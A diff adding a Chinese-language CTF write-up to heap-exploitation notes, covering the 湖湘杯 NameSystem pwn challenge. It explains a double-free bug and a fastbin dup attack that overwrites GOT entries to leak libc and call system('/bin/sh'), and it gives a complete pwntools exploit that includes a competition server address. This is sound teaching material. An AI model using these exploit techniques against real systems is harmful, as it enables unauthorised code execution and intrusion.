@@ -445,7 +445,7 @@ fastbin()函数，是根据 fast bin 的 index，获得 fast bin 的地址。其
 #define fastbin(ar_ptr, idx) ((ar_ptr)->fastbinsY[idx]) 
 ```
 
-fastbin_index(sz) 用于获得 fast bin 在 fast bins 数组中的 index，由于 bin[0]和 bin[1]中 的chunk不存在，所以需要减2，对于SIZE_SZ为4B的平台，将sz除以8减2得到fast bin index， 对于 SIZE_SZ 为 8B 的平台，将 sz 除以 16 减去 2 得到 fast bin index。 
+fastbin_index(sz) 用于获得 fast bin 在 fast bins 数组中的 index，**由于 bin[0]和 bin[1]中 的chunk不存在，所以需要减2**，对于SIZE_SZ为4B的平台，将sz除以8减2得到fast bin index， 对于 SIZE_SZ 为 8B 的平台，将 sz 除以 16 减去 2 得到 fast bin index。 
 
 ```c++
 #define fastbin_index(sz) \   ((((unsigned int)(sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) 
@@ -701,5 +701,499 @@ r.interactive() #交互时调用任何一个涉及到free的操作就可以，�
 ```
 
 注：由于libc版本的原因，好像攻击不成功。
+
+## 插播——湖湘杯NameSystem
+
+逃不掉爱旅行的个性啊，大四的疯玩时光，有荒废了半个月没做题。
+
+结果就是湖湘杯啥堆题也解不开，(ಥ﹏ಥ)，做的题太少了，很复杂的绕过的方式就不能get。
+
+趁着网上的wp写的都不详细，我来一波详细题解吧。
+
+#### 一、可参考解题思路
+
+本题有很多不同的解法，可以是单纯使用fastbin attack和got表、plt表覆写来泄露libc，从而getshell；可以是使用fastbin attack，将free(单一参数)->printf(单一参数)，从而构造格式化字符串漏洞。还可以使用one_gadget.
+
+>似乎堆题的考察点不在关注在libc版本上了，因此很多都是直接默认libc-2.23.so，去获得一些symbols['xxx']的值
+
+#### 二、程序分析
+
+###### 1.程序保护情况
+
+这是一个64位程序，可以进行GOT表和PLT表覆写，栈上有canary需要绕过。
+
+![](/img/hitcon2/hxb2_3.png)
+
+###### 2.main
+
+程序一共分为四个功能，add name用于添加一个姓名记录，drop name用户删除一个姓名记录，show name实际是一个摆设，空壳没功能，exit退出。
+
+![](/img/hitcon2/hxb2_4.png)
+
+###### 3.add name功能
+
+add功能从名字上看就是一个分配堆块的功能，同时要输入name size、name的内容。输入成功则完成。
+
+![](/img/hitcon2/hxb2_2.png)
+
+具体而言：
+
+![](/img/hitcon2/hxb2_5.png)
+
+①中可以观察到这是一个存放name记录的列表void* ptr[20]，位于bss字段，可以存放下20个name记录。这里**检查了idx∈[0,19]是否有空ptr[idx]**，有就表示可以放下一个name记录。否则就提示“Not any more!!”。
+
+注：ptr和stdin以及stdout很近。
+
+![](/img/hitcon2/hxb2_6.png)
+
+②输入name记录的大小v2，要求v2∈[16,96]，通过调用sub_400941()间接调用sub_400846（从终端输入size）、atoi将size转化为整型int。
+
+③输入name记录的内容。首先通过malloc分配v2大小的chunk，将chunk的mem地址存储到第一个空ptr[i]，在调用sub_400946()在chunk中写入name记录的内容。
+
+![](/img/hitcon2/hxb2_7.png)
+
+通过上述分析我们可以确定NameSystem的记录存储格式如下：
+
+![](/img/hitcon2/hxb2_8.png)
+
+###### 4.drop name功能
+
+![](/img/hitcon2/hxb2_9.png)
+
+这里黄色的部分存在double free的漏洞。试想这里只是删除一个ptr之后，把后面的ptr指针前移，但是没有把前移后原来的那个指针删掉。
+
+也就是说如果装满了20个chunk的mem地址（从0-19），我删除了idx=17，那么就是把18移动到了17，19移动到了18，但是没有设置ptr[19]=0。
+
+ptr由addr0，addr1，addr2，……，addr17，addr18，addr19变为addr0，addr1，addr2，……，addr18，**addr19，addr19**
+
+由于这里只通过检查ptr[idx]是否为0，来避免double free。而这里ptr[18]和ptr[19]都!=0，那么可以free两次addr19，造成double free【只要避免连续free同一个地址就行】。
+
+#### 三、本题攻击思路
+
+通过上面的程序功能我们明确了漏洞点，现在要思考一些攻击的方法。
+
+现在最大的问题在于我们没有任何一个输出功能，也就是不能造成泄露，得不到system函数的地址（系统里本身没有system_plt）。
+
+注意：这里的show name就是一个摆设，我们需要想办法实现一个print功能。
+
+**一个可行的办法**是进行三次fastbin double free attack，从而可以选择在三个地方分配chunk，写入数据。
+
+- 选择一个<u>已解析的库函数got表写入ptr[0]</u>（伪造chunk1到这个库函数的got表或附近）
+  - fastbin dup into someplace这类攻击，可能无法准确定位到ptr[0]的原因在于，不是单纯改fd字段链入一个someplace chunk就可以malloc出来了【改fd只是把这个chunk链入fastbin】，而在malloc出这个someplace的chunk的时候，还要检查其size字段是否满足所在的fastbin链。因此很多时候准确定位got表处分配很可能会没有满足条件，所以要选在附近。
+  - 期初要依据someplace附近的情况，要动态调整选择构造double free/fastbin dup的链的对应大小。
+- 伪造chunk2到free的got表，将<u>free的got表改成puts的plt表</u>->**从而构造了print函数**，调用dropname，则调用了free，相当于调用了puts
+  - 将free的got表改成puts的plt表，那么在call free的时候，会先转入free plt中执行jmp *free_got，然后跳转到put plt，执行jmp *put_got等一系列操作，从而调用puts。
+- 因此<u>调用drop name，设置id=0，则free(ptr[0])相当于puts(ptr[0]) ，即puts(已解析的库函数got表)，得到该库函数的真实地址</u>
+- 通过libc-2.23中该函数的偏移量，得到libc基地址，从而<u>计算出system函数地址</u>。
+- 伪造chunk3到atoi函数的got表，<u>将atoi函数got表项修改值为system函数地址</u>
+- <u>打印菜单输入选项时（输入/bin/sh），调用atoi，相当于system("/bin/sh")</u>
+
+#### 四、根据脚本解析攻击过程
+
+###### 1.前期准备
+
+```python
+context.log_level='debug'
+file_name = './NameSystem' 
+libc_name = '/lib/x86_64-linux-gnu/libc.so.6' #默认使用本机或攻击机的libc-2.23版本库
+r = process(file_name)
+libc = ELF(libc_name) #可以直接通过libc.symbols['xxxx']来计算偏移量
+# 实现调用两个功能的python格式
+file = ELF(file_name)
+#输入输出封装
+sl = lambda x : r.sendline(x)
+sd = lambda x : r.send(x)
+sla = lambda x,y : r.sendlineafter(x,y)
+rud = lambda x : r.recvuntil(x,drop=True)
+ru = lambda x : r.recvuntil(x)
+li = lambda name,x : log.info(name+':'+hex(x))
+ri = lambda  : r.interactive()
+# add name
+def create(chunk_size,value):
+    ru('Your choice :')
+    sl('1')
+    ru('Name Size:')
+    sl(str(chunk_size))
+    ru('Name:')
+    sl(value)
+# drop name
+def delete(index):
+    ru('Your choice :')
+    sl('3')
+    ru('The id you want to delete:')
+    sl(str(index))
+# 用于自己debug，raw_input()用于从终端获取输入
+def debug():
+    gdb.attach(r)
+    raw_input()
+```
+
+###### 2.三个fastbin dup
+
+问题：为什么要提前准备三个fastbin dup chunk呢？
+
+原因在于，我们在构造ptr[0]=某选定库函数的got表（需要一个fake chunk）之后，会把free got修改为puts plt（需要一个fake chunk），这以后drop name不再具备free的功能了（构造不了double free/fastbin dup），因此还剩下的一个fake chunk要之前就准备好。故提前准备三个fastbin dup chunk，并且**由于double free之后，malloc了构造的fake chunk之后这个fastbin的链条被破坏了，因此三个fastbin dup chunk所在的fastbin链要不同。**
+
+<u>第一个fake chunk——设置在free got 附近：</u>
+
+一开始malloc了17个0x20大小的chunk：
+
+```python
+for x in range(17):
+	create(0x20,"\x11")
+```
+
+![](/img/hitcon2/hxb2_10.png)
+
+接下来确定fake chunk的size，考虑free got附近的情况
+
+![](/img/hitcon2/hxb2_12.png)
+
+找到一个可用的size字段，可以在0x601ffa处伪造一个fake chunk，其size字段为0x60【64-bit平台下会去除最后的4bit和高位4个字节来计算fastbin的idx，具体详见上一题的检查点2】，因此double free构建的fake chunk的size可以为0x58，这样其真实分配的值为（0x58+8）align 16 =0x60，可以绕过检查。
+
+因此**在0x58大小的fastbin链中进行double free**，此后修改fd为0x601ffa，链入的此处的在free_got附近的fake chunk，则可以绕过大小检查：
+
+```python
+create(0x58,"\x22")
+create(0x58,"\x22")
+create(0x58,"\x22")
+delete(18) # double free，注意不可连续free同一个chunk
+delete(18)
+delete(17)
+delete(19)
+fake_chunk1 = 0x601FFA
+```
+
+（1）create(0x58，“\x22”)三次以后
+
+![](/img/hitcon2/hxb2_13.png)
+
+（2）double free的过程
+
+![](/img/hitcon2/hxb2_14.png)
+
+**注意：**double free不能连续free同一个chunk，要在中间夹一个chunk（这个是chunkq）。
+
+<u>第二个fake chunk——设置在ptr[0]附近：</u>
+
+可以观察到在ptr[0]附近，可以借用stdin和stdout的值，得到一个size为7f的fake chunk【64-bit平台下会去除最后的4bit和高位4个字节来计算fastbin的idx，具体详见上一题的检查点2】，因此malloc的fake chunk要求为0x60，这样真实分配的chunk size为（0x60+8）align 16= 0x70。0x7f和0x70在以下函数的计算下的结果一致，因此这里要double free chunk的分配值设置为0x60即可。同时**修改double free chunk的fd为0x60208d**，链入位于ptr[0]附近的fake chunk，之后请求malloc(0x60)会得到这个chunk。
+
+```c++
+#define fastbin_index(sz) \   ((((unsigned int)(sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) 
+//64位平台下相当于：
+//((((unsigned int)(sz)) >> 4) - 2) 
+```
+
+![](/img/hitcon2/hxb2_11.png)
+
+实现脚本如下：
+
+```python
+for x in range(17):
+	delete(0)
+
+for x in range(15):
+	create(0x20,"\x22")
+
+create(0x60,"\x33")
+create(0x60,"\x33")
+create(0x60,"\x33")
+delete(18)
+delete(18)
+delete(17)
+delete(19)
+fake_chunk2 = 0x60208D #control ptr
+```
+
+（1）清空上一轮的chunk
+
+![](/img/hitcon2/hxb2_15.png)
+
+（2）create(0x20)进行15次，将剩下的前17个chunk填满【0x20相关的fastbins不太考虑，简述了，地址用x表示】。
+
+![](/img/hitcon2/hxb2_16.png)
+
+（3）构造double free
+
+![](/img/hitcon2/hxb2_17.png)
+
+<u>第三个fake chunk——设置在atoi_got表项附近：</u>
+
+由于每次执行完一个功能，都会打印菜单并且输入选项，而输入选项中会调用atoi转化为int型选项值，而且atoi只有一个字符串参数【system只需要一个字符串参数】，因此把atoi_got表项的值改为system_got，最合适了。
+
+故在while中，输入的选项时输入为“/bin/sh”，而atoi_got改为system_got，就相当于在输入选项时，执行了system(“/bin/sh”)。
+
+因此要为修改atoi_got表项的值，设置一个fake chunk，因此再次利用double free漏洞。
+
+通过观察atoi_got附近的情况，找到合适的fake chunk位置，以绕过size检查，如下图可选的有0x602032或0x602022。可以在这两个地方构造fake chunk，在double free后修改fd的值为0x602032或0x602022，即可得到fake chunk。这里以0x602022为例，由于malloc出的fake chunk的size必须能够覆盖到atoi_got表项【即0x602060】，这样才方便修改该表项值为system。
+
+![](/img/hitcon2/hxb2_18.png)
+
+因此对于0x602022位置作为fake chunk的头地址，至少要malloc(0x38)才可以对atoi_got进行修改。而（0x38 + 8）align = 0x40，恰好满足fake chunk的size，可以绕过fastbin的检查。
+
+实现脚本为：
+
+```python
+for x in range(15):
+	delete(2)
+
+for x in range(13):
+	create(0x20,"\x33")
+    
+create(0x38,"\x44")
+create(0x38,"\x44")
+create(0x38,"\x44")
+delete(18)
+delete(18)
+delete(17)
+delete(19)
+fake_chunk3 = 0x602022 #control got table
+
+for x in range(13):
+	delete(4)
+```
+
+（1）清空prt，delete(2)15次以后
+
+![](/img/hitcon2/hxb2_19.png)
+
+（2）之后是double free的过程，这里只需要填充到idx=16，即填充13个chunk 0x20。此后idx=17,18,19进行double free的操作。这里简述，得到的fast bin情况为：
+
+![](/img/hitcon2/hxb2_20.png)
+
+（3）之后从idx=4开始，删除13个chunk，ptr的情况如下：
+
+![](/img/hitcon2/hxb2_21.png)
+
+###### 3.攻击过程
+
+攻击分为4步：
+
+- 设置ptr[0]为某已解析动态库函数的got表项地址，这里选择atoi，因为第一遍输入菜单选项时，这个函数就已经被解析了。
+- 设置free_got表项的值为puts_plt，调用drop name打印获得到动态链接库函数的真实加载地址
+- 将atoi_got表项的值设置为system的真实加载地址
+- 下一次while循环，打印菜单时输入选项为“/bin/sh”，得到shell
+
+当前fastbins的情况如下：
+
+>0x40: N->K->N->M
+>
+>0x60: u->q->u->w
+>
+>0x70: C->A->C->B
+
+第①步实现脚本如下：
+
+```python
+#modify ptr[0]=atoi got addr
+file_name = './NameSystem'
+file = ELF(file_name)
+
+fake_chunk2 = 0x60208D #control ptr
+
+create(0x60,p64(fake_chunk2)) # malloc(0x60)实际请求0x70大小的chunk，chunk C符合了这个请求，此时chunk C在（free）fastbin 中也存在着。
+# 对chunk C的user area写入fake_chunk2（chunk头地址），修改了还处于fastbin中的free chunkC的fd字段
+# 此时fastbin 0x60变为A->C->fake_chunk2
+create(0x60,"\xaa") #得到chunkq，此时fastbin 0x60变为C->fake_chunk2
+create(0x60,"\xaa") #得到chunku，此时fastbin 0x60变为fake_chunk2
+atoi_got = file.got['atoi'] #获得atoi的got表项地址
+create(0x60,'\x00'*3+p64(atoi_got)) #fake_chunk2满足了本次malloc(0x60)的请求，可以对该chunk的user area写入
+# 观察下图，fake_chunk2的user area位于0x60209d，而ptr[0]位于0x6020a0
+# 因此填充0x6020a0-0x60209d = 3个任意字符以后，再填入atoi的got表项地址
+# 就可以设置ptr[0]=*0x6020a0=atoi_got addr
+```
+
+![](/img/hitcon2/hxb2_11.png)
+
+第②步实现脚本如下：
+
+```python
+# modify free got => puts plt
+# fastbin 0x60: u->q->u->w
+fake_chunk1 = 0x601FFA
+create(0x58,p64(fake_chunk1)) #malloc(0x58),实际分配0x60，获得chunku，对user area（是free chunku的fd字段）写入fake_chunk1
+# fastbin 0x60变为 q->u->fake_chunk1
+create(0x58,"\xaa") # fastbin 0x60: u->fake_chunk1
+create(0x58,"\xaa") # fastbin 0x60: fake_chunk1
+create(0x58,'a'*14+'\xa0\x06\x40\x00\x00\x00') # 获得fake_chunk1
+# 观察下图，fake_chunk1的user area位于0x60200a，而free_got位于0x602018
+# 故填充0x602018-0x60200a=14个任意字符后，则可以在0x602018位置写入puts_plt(0x0000004006a0,如下图)
+# 从而free_got表项的值为puts plt片段的第一行代码地址
+delete(0) #delete(0)触发free(ptr[0]),即puts(ptr[0])。而ptr[0]中写入了atoi_got表项地址，从而实现泄露atoi_got的真实加载地址
+# debug()
+libc_base = u64(rud("\n")+"\x00\x00")-libc.symbols['atoi'] #得到libc基地址
+```
+
+![](/img/hitcon2/hxb2_12.png)
+
+![](/img/hitcon2/hxb2_22.png)
+
+第③步实现脚本如下：
+
+```python
+#modify atoi got => system
+fake_chunk3 = 0x602022 #control got table
+# fastbin 0x40: N->K->N->M
+create(0x38,p64(fake_chunk3)) # fastbin 0x40: K->N->fake_chunk3
+create(0x38,"\xaa")# fastbin 0x40: N->fake_chunk3
+create(0x38,"\xaa")# fastbin 0x40: fake_chunk3
+# 根据②中得到的libc基地址，计算出多个函数的真实加载地址，填入对应的got表，这样不会影响程序的其他功能的运行，导致栈帧破坏
+printf_addr = libc_base+libc.symbols['printf']
+alarm_addr = libc_base+libc.symbols['alarm']
+read_addr = libc_base+libc.symbols['read']
+system_addr = libc_base+libc.symbols['system']
+
+# 这里获得fake_chunk3，由于fake_chunk3的user area位于0x602032，对照got表进行填充【保持会用到的函数用正确的加载真实地址覆盖】，最后将atoi_got表项的内容覆盖为system的真实加载地址
+create(0x38,"\x00"*6+p64(printf_addr)+p64(alarm_addr)+p64(read_addr)+'\x00'*16+p64(system_addr))
+```
+
+![](/img/hitcon2/hxb2_18.png)
+
+![](/img/hitcon2/hxb2_23.png)
+
+第④步实现脚本如下：
+
+上述creat完成后，会进入while循环，打印菜单，输入菜单选项，这时候输入/bin/sh，atoi("/bin/sh")==>system("/bin/sh")!!!成功
+
+```python
+r.sendline("/bin/sh\x00")
+# debug()
+r.interactive()
+```
+
+#### 五、Exploit
+
+```python
+from pwn import *
+import sys
+context.log_level='debug'
+debug = 1
+file_name = './NameSystem'
+libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
+ip = '183.129.189.62'
+prot = '14005'
+if debug:
+    r = process(file_name)
+    libc = ELF(libc_name)
+else:
+    r = remote(ip,int(prot))
+    libc = ELF(libc_name)
+
+file = ELF(file_name)
+
+sl = lambda x : r.sendline(x)
+sd = lambda x : r.send(x)
+sla = lambda x,y : r.sendlineafter(x,y)
+rud = lambda x : r.recvuntil(x,drop=True)
+ru = lambda x : r.recvuntil(x)
+li = lambda name,x : log.info(name+':'+hex(x))
+ri = lambda  : r.interactive()
+
+
+def create(chunk_size,value):
+    ru('Your choice :')
+    sl('1')
+    ru('Name Size:')
+    sl(str(chunk_size))
+    ru('Name:')
+    sl(value)
+
+def delete(index):
+    ru('Your choice :')
+    sl('3')
+    ru('The id you want to delete:')
+    sl(str(index))
+
+
+def debug():
+    gdb.attach(r)
+    raw_input()
+
+for x in range(17):
+	create(0x20,"\x11")
+
+create(0x58,"\x22")
+create(0x58,"\x22")
+create(0x58,"\x22")
+delete(18)
+delete(18)
+delete(17)
+delete(19)
+fake_chunk1 = 0x601FFA
+
+
+
+for x in range(17):
+	delete(0)
+
+for x in range(15):
+	create(0x20,"\x22")
+
+create(0x60,"\x33")
+create(0x60,"\x33")
+create(0x60,"\x33")
+delete(18)
+delete(18)
+delete(17)
+delete(19)
+fake_chunk2 = 0x60208D #control ptr
+
+for x in range(15):
+	delete(2)
+
+for x in range(13):
+	create(0x20,"\x33")
+
+create(0x38,"\x44")
+create(0x38,"\x44")
+create(0x38,"\x44")
+delete(18)
+delete(18)
+delete(17)
+delete(19)
+fake_chunk3 = 0x602022 #control got table
+
+
+for x in range(13):
+	delete(4)
+
+# 开始攻击
+create(0x60,p64(fake_chunk2))
+create(0x60,"\xaa")
+create(0x60,"\xaa")
+atoi_got = file.got['atoi']
+create(0x60,'\x00'*3+p64(atoi_got))#modify ptr[0]=atoi got addr
+
+create(0x58,p64(fake_chunk1))
+create(0x58,"\xaa")
+create(0x58,"\xaa")
+create(0x58,'a'*14+'\xa0\x06\x40\x00\x00\x00')# modify free got => puts plt
+delete(0)
+# debug()
+libc_base = u64(rud("\n")+"\x00\x00")-libc.symbols['atoi']
+li("libc_base",libc_base)
+
+create(0x38,p64(fake_chunk3))
+create(0x38,"\xaa")
+create(0x38,"\xaa")
+printf_addr = libc_base+libc.symbols['printf']
+alarm_addr = libc_base+libc.symbols['alarm']
+read_addr = libc_base+libc.symbols['read']
+system_addr = libc_base+libc.symbols['system']
+create(0x38,"\x00"*6+p64(printf_addr)+p64(alarm_addr)+p64(read_addr)+'\x00'*16+p64(system_addr))#modify atoi got => system
+sl("/bin/sh\x00")
+# debug()
+ri()
+```
+
+##### 攻击结果——Get Shell
+
+![](/img/hitcon2/hxb2_1.png)
+
+#### 六、参考链接
+
+- http://radishes.top/2019/11/12/2019-11-12-2019hxb/
+- https://zhuanlan.zhihu.com/p/91956265
+- http://www.g3n3rous.fun/index.php/archives/77/
 
 ## lab13
